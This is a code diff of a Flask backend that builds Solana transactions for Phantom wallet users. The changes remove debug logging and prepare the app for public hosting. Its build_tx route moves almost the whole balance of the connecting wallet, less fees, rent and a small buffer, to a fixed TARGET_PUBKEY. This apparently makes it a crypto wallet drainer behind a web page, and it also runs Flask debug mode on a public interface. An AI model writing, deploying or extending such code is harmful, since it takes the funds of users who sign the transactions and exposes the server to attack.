@@ -1,16 +1,17 @@
-from flask import Flask, request, jsonify, send_from_directory
-from flask_cors import CORS
-from solana.rpc.api import Client
 from solana.publickey import PublicKey
 from solana.transaction import Transaction
 from solana.system_program import TransferParams, transfer
+from solana.rpc.api import Client
 import base64
+import os
 import traceback
+
+from flask import Flask, request, jsonify, send_from_directory
+from flask_cors import CORS
 
 app = Flask(__name__, static_folder="static")
 CORS(app)
 
-# Use a reliable mainnet RPC endpoint
 RPC_URL = "https://api.mainnet-beta.solana.com"
 client = Client(RPC_URL)
 
@@ -56,20 +57,8 @@ def build_tx():
             raise Exception("Failed to fetch rent exemption minimum")
         rent_exempt = rent_resp["result"]
 
-        SAFETY_BUFFER = 1_000_000  # Leave 0.001 SOL extra for Phantom's safety
+        SAFETY_BUFFER = 1_000_000  # Leave 0.001 SOL more for Phantom's safety
         send_amount = balance - fee - rent_exempt - SAFETY_BUFFER
-
-        print("========== TRANSACTION DEBUG ==========")
-        print("Sender (from):", sender)
-        print("Fee payer:", sender)
-        print("Recipient (TARGET_PUBKEY):", TARGET_PUBKEY)
-        print("Amount to send (lamports):", send_amount)
-        print("Full balance (lamports):", balance)
-        print("Estimated fee (lamports):", fee)
-        print("Rent exempt minimum (lamports):", rent_exempt)
-        print("Safety buffer (lamports):", SAFETY_BUFFER)
-        print("Blockhash:", blockhash)
-        print("=======================================")
 
         if send_amount <= 0:
             return jsonify({"error": "Insufficient balance to cover fee + rent exemption + buffer"}), 400
@@ -88,7 +77,8 @@ def build_tx():
 
     except Exception as e:
         traceback.print_exc()
-        return jsonify({"error": f"{type(e).__name__}: {e}"}), 500
+        return jsonify({"error": str(e)}), 500
 
 if __name__ == "__main__":
-    app.run(debug=True)
+    port = int(os.environ.get("PORT", 5000))  # <-- get Render-assigned port
+    app.run(host="0.0.0.0", port=port, debug=True)
